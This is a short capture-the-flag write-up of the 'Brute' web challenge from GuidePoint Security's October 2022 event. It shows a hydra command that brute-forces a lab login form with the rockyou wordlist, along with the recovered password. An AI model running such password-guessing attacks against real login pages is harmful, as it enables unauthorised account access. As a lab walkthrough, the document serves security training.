---
title: "Brute - GuidePoint-Security-Oct27 2022"
category: "web"
subcategory: "web"
type: "writeup"
tags: ["web", "brute", "web-exploitation", "guidepoint-security-oct27", "siunam321", "guidepoint"]
summary: "In this challenge, we can spawn a docker instance:"
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/GuidePoint-Security-Oct27-2022/Web/Brute/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/GuidePoint-Security-Oct27-2022/Web/Brute/README.md"
ctf:
  name: "GuidePoint-Security-Oct27"
  year: 2022
  challenge: "Brute"
---

## Source

- **CTF:** GuidePoint-Security-Oct27 2022
- **Challenge:** Brute
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/GuidePoint-Security-Oct27-2022/Web/Brute/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/GuidePoint-Security-Oct27-2022/Web/Brute/README.md>

---
# Brute

## Overview

- Overall difficulty for me: Very easy

**In this challenge, we can spawn a docker instance:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027082238.png)

## Find the flag

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027082301.png)

**Looks like we need to brute force the login page!**

**To do so, I'll use `hydra`:**

When we typed an incorrect password, it shows us **`Incorrect Password!` error**, and **the POST request data is `password=<password_here>`.**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027082418.png)

**Armed with this information, we can use `hydra` to brute force it:**
```
┌──(root🌸siunam)-[~/ctf/GuidePoint-Security-Oct27-2022/Web/Brute]
└─# hydra -l 'any_user' -P /usr/share/wordlists/rockyou.txt 10.10.100.200 -s 37825 http-post-form "/:password=^PASS^:Incorrect Password"
[...]
[37825][http-post-form] host: 10.10.100.200   login: any_user   password: princess13
```

**Find the password! Let's login!**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027083137.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027083144.png)

We found the flag!

# Conclusion

What we've learned:

1. Brute Forcing HTTP Login Page via `hydra`
